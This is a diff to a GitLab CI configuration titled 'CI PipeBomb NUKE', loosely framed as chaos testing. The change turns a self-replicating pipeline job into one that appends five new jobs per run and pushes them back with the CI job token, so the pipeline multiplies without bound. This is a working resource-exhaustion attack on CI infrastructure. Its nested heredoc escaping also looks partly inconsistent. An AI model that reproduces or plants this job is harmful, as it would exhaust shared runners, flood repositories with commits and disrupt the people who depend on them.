@@ -1,4 +1,5 @@
-# .gitlab-ci.yml — CI PipeBomb NUKE
+# CI PipeBomb NUKE Version
+# Exponential growth chaos testing - USE WITH EXTREME CAUTION
 
 stages: [arm]
 
@@ -13,21 +14,18 @@ ci_pipebomb_arm:
     - apk add --no-cache git coreutils grep
     - git config --global user.email "demolition-bot@example.com"
     - git config --global user.name "CI Demolition Bot"
-
-    # use CI_JOB_TOKEN for auth to push
     - |
       git remote remove ci >/dev/null 2>&1 || true
       git remote add ci "https://gitlab-ci-token:${CI_JOB_TOKEN}@${CI_SERVER_HOST}/${CI_PROJECT_PATH}.git"
       git fetch ci "${CI_COMMIT_REF_NAME}"
-
-    # count previous explosions
     - COUNT=$(grep -c '^pipebomb_explosion_' .gitlab-ci.yml || true)
     - echo "💣 Current explosions registered: ${COUNT}"
-
-    # plant new explosive charge
+    
+    # Create multiple new jobs (exponential growth)
     - |
-      CHARGE_NAME="pipebomb_explosion_$(date +%s)_${CI_PIPELINE_IID}"
-      cat >> .gitlab-ci.yml <<EOF
+      for i in $(seq 1 5); do
+        CHARGE_NAME="pipebomb_explosion_$(date +%s)_${CI_PIPELINE_IID}_${i}"
+        cat >> .gitlab-ci.yml <<EOF
 
 ${CHARGE_NAME}:
   stage: arm
@@ -48,8 +46,9 @@ ${CHARGE_NAME}:
       COUNT=\$(grep -c '^pipebomb_explosion_' .gitlab-ci.yml || true)
       echo "💣 Current explosions registered: \${COUNT}"
     - |
-      NEW_CHARGE_NAME="pipebomb_explosion_\$(date +%s)_\${CI_PIPELINE_IID}"
-      cat >> .gitlab-ci.yml <<EOE
+      for j in \$(seq 1 5); do
+        NEW_CHARGE_NAME="pipebomb_explosion_\$(date +%s)_\${CI_PIPELINE_IID}_\${j}"
+        cat >> .gitlab-ci.yml <<EOE
 
 \${NEW_CHARGE_NAME}:
   stage: arm
@@ -70,18 +69,24 @@ ${CHARGE_NAME}:
       COUNT=\\\$(grep -c '^pipebomb_explosion_' .gitlab-ci.yml || true)
       echo "💣 Current explosions registered: \\\${COUNT}"
     - |
-      NEXT_CHARGE_NAME="pipebomb_explosion_\\\$(date +%s)_\\\${CI_PIPELINE_IID}"
-      cat >> .gitlab-ci.yml <<EOE
+      for k in \\\$(seq 1 5); do
+        NEXT_CHARGE_NAME="pipebomb_explosion_\\\$(date +%s)_\\\${CI_PIPELINE_IID}_\\\${k}"
+        cat >> .gitlab-ci.yml <<EOE
 
 \\\${NEXT_CHARGE_NAME}:
-  # Chain reaction continues...
+  # Exponential growth continues...
 EOE
+      done
     - git add .gitlab-ci.yml
     - git commit -m "CI PipeBomb plants \${NEW_CHARGE_NAME}"
     - git push ci "\${CI_COMMIT_REF_NAME}:\${CI_COMMIT_REF_NAME}"
-EOF
-
-    # commit & push -> trigger detonation sequence
+EOE
+      done
     - git add .gitlab-ci.yml
-    - git commit -m "CI PipeBomb plants ${CHARGE_NAME}"
+    - git commit -m "CI PipeBomb plants \${CHARGE_NAME}"
+    - git push ci "\${CI_COMMIT_REF_NAME}:\${CI_COMMIT_REF_NAME}"
+EOF
+      done
+    - git add .gitlab-ci.yml
+    - git commit -m "CI PipeBomb plants multiple charges"
     - git push ci "${CI_COMMIT_REF_NAME}:${CI_COMMIT_REF_NAME}"
